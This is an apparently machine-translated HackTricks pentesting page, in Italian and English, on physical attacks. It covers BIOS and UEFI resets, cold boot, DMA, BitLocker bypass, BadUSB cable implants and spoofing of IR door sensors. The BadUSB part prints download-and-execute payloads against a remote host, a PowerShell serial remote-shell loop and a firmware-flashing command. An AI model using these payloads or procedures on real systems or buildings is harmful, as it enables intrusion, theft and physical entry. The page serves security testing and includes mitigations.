# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero password BIOS e sicurezza del sistema

**Resetting the BIOS** può essere ottenuto in diversi modi. La maggior parte delle schede madri include una **batteria** che, se rimossa per circa **30 minuti**, ripristinerà le impostazioni del BIOS, inclusa la password. In alternativa, un **ponticello sulla scheda madre** può essere regolato per resettare queste impostazioni collegando specifici pin.

Per situazioni in cui le modifiche hardware non sono possibili o pratiche, gli **strumenti software** offrono una soluzione. Avviare il sistema da un **Live CD/USB** con distribuzioni come **Kali Linux** fornisce accesso a strumenti come **_killCmos_** e **_CmosPWD_**, che possono assistere nel recupero della password del BIOS.

Nei casi in cui la password del BIOS è sconosciuta, inserirla in modo errato **tre volte** di solito produrrà un codice di errore. Questo codice può essere utilizzato su siti web come [https://bios-pw.org](https://bios-pw.org) per recuperare potenzialmente una password utilizzabile.

### Sicurezza UEFI

Per i sistemi moderni che utilizzano **UEFI** invece del BIOS tradizionale, lo strumento **chipsec** può essere utilizzato per analizzare e modificare le impostazioni UEFI, incluso il disabilitare **Secure Boot**. Questo può essere realizzato con il seguente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

La RAM conserva i dati per breve tempo dopo l'interruzione dell'alimentazione, di solito per **1–2 minuti**. Questa persistenza può essere estesa fino a **10 minuti** applicando sostanze fredde, come l'azoto liquido. Durante questo periodo esteso, è possibile creare un **memory dump** usando strumenti come **dd.exe** e **volatility** per l'analisi.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** è uno strumento progettato per la **manipolazione della memoria fisica** tramite DMA, compatibile con interfacce come **FireWire** e **Thunderbolt**. Permette di bypassare le procedure di login patchando la memoria per accettare qualsiasi password. Tuttavia, è inefficace contro i sistemi **Windows 10**.

---

## Live CD/USB for System Access

Sostituire binari di sistema come **_sethc.exe_** o **_Utilman.exe_** con una copia di **_cmd.exe_** può fornire un prompt dei comandi con privilegi di sistema. Strumenti come **chntpw** possono essere usati per modificare il file **SAM** di un'installazione Windows, permettendo di cambiare le password.

**Kon-Boot** è uno strumento che facilita l'accesso a sistemi Windows senza conoscere la password modificando temporaneamente il kernel di Windows o l'UEFI. Maggiori informazioni si trovano su [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Scorciatoie di avvio e ripristino

- **Supr**: Accede alle impostazioni del BIOS.
- **F8**: Entra in modalità di ripristino.
- Premere **Shift** dopo il banner di Windows può aggirare l'accesso automatico.

### BAD USB Devices

Dispositivi come **Rubber Ducky** e **Teensyduino** fungono da piattaforme per creare dispositivi **bad USB**, in grado di eseguire payload predefiniti quando connessi a un computer target.

### Volume Shadow Copy

I privilegi di amministratore consentono la creazione di copie di file sensibili, incluso il file **SAM**, tramite PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Impianti basati su ESP32-S3 come **Evil Crow Cable Wind** si nascondono all'interno di cavi USB-A→USB-C o USB-C↔USB-C, si enumerano unicamente come tastiera USB ed espongono il loro stack C2 via Wi‑Fi. L'operatore deve solo alimentare il cavo dal host vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con password `123456789` e navigare su [http://cable-wind.local/](http://cable-wind.local/) (o sul suo indirizzo DHCP) per raggiungere l'interfaccia HTTP embedded.
- L'interfaccia browser offre schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload memorizzati sono taggati per OS, i layout della tastiera vengono cambiati al volo e le stringhe VID/PID possono essere alterate per imitare periferiche note.
- Poiché il C2 risiede all'interno del cavo, un telefono può preparare i payload, attivare l'esecuzione e gestire le credenziali Wi‑Fi senza toccare l'OS host — ideale per intrusioni fisiche con breve tempo di permanenza.

### OS-aware AutoExec payloads

- Le regole AutoExec associano uno o più payload per essere eseguiti immediatamente dopo l'enumerazione USB. L'impianto esegue un fingerprint OS leggero e seleziona lo script corrispondente.
- Esempio di flusso di lavoro:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è non presidiata, semplicemente sostituire un cavo di ricarica può ottenere l'accesso iniziale “plug-and-pwn” nel contesto dell'utente connesso.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Un payload memorizzato apre una console e incolla un loop che esegue tutto ciò che arriva sul nuovo dispositivo seriale USB. Una variante minima per Windows è:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L'implant mantiene aperto il canale USB CDC mentre il suo ESP32-S3 lancia un TCP client (Python script, Android APK, or desktop executable) di ritorno verso l'operatore. Qualsiasi byte digitato nella TCP session viene inoltrato nel serial loop sopra, consentendo remote command execution anche su host air-gapped. L'output è limitato, quindi gli operatori tipicamente eseguono comandi alla cieca (creazione di account, staging di tool aggiuntivi, ecc.).

### Superficie di aggiornamento HTTP OTA

- Lo stesso web stack di solito espone aggiornamenti firmware non autenticati. Evil Crow Cable Wind ascolta su `/update` e scrive in flash qualsiasi binario venga caricato:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Gli operatori sul campo possono hot-swap funzionalità (es., flash USB Army Knife firmware) mid-engagement senza aprire il cavo, permettendo all'implant di pivotare verso nuove capacità mentre è ancora collegato al target host.

## Bypass della crittografia BitLocker

La crittografia BitLocker può potenzialmente essere bypassata se la **recovery password** viene trovata all'interno di un file di memory dump (**MEMORY.DMP**). Strumenti come **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic** possono essere utilizzati per questo scopo.

---

## Social Engineering per l'aggiunta di una recovery key

Una nuova recovery key di BitLocker può essere aggiunta tramite tattiche di social engineering, convincendo un utente a eseguire un comando che aggiunge una nuova recovery key composta da zeri, semplificando così il processo di decrittazione.

---

## Sfruttare Chassis Intrusion / Maintenance Switches per resettare il BIOS alle impostazioni di fabbrica

Molti laptop moderni e desktop small-form-factor includono un **chassis-intrusion switch** che è monitorato dall'Embedded Controller (EC) e dal firmware BIOS/UEFI. Mentre lo scopo principale dell'interruttore è segnalare l'apertura del dispositivo, i produttori talvolta implementano una scorciatoia di recovery non documentata che viene attivata quando l'interruttore viene commutato secondo uno specifico pattern.

### Come funziona l'attacco

1. L'interruttore è cablato a un **GPIO interrupt** sull'EC.
2. Il firmware in esecuzione sull'EC tiene traccia del **timing e del numero di pressioni**.
3. Quando viene riconosciuto un pattern hard-coded, l'EC invoca una routine *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS di sistema**.
4. Al successivo avvio, il BIOS carica i valori di default – **supervisor password, Secure Boot keys e tutte le configurazioni personalizzate vengono cancellate**.

> Una volta che Secure Boot è disabilitato e la firmware password è rimossa, l'attaccante può semplicemente avviare qualsiasi immagine OS esterna e ottenere accesso illimitato ai dischi interni.

### Esempio reale – Framework 13 Laptop

La scorciatoia di recovery per il Framework 13 (11th/12th/13th-gen) è:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Dopo il decimo ciclo l'EC imposta un flag che istruisce il BIOS a cancellare la NVRAM al prossimo riavvio. L'intera procedura richiede ~40 s e necessita **solo di un cacciavite**.

### Generic Exploitation Procedure

1. Power-on or suspend-resume the target so the EC is running.
2. Rimuovere il coperchio inferiore per esporre l'interruttore di intrusione/manutenzione.
3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
4. Riassemblare e riavviare – le protezioni firmware dovrebbero essere disabilitate.
5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Registrare gli eventi di intrusione del chassis nella console di gestione OS e correlare con reset imprevisti del BIOS.
* Impiegare **sigilli anti-manomissione** su viti/coperchi per rilevare aperture.
* Conservare i dispositivi in **aree fisicamente controllate**; assumere che l'accesso fisico equivalga a compromissione totale.
* Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation for NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
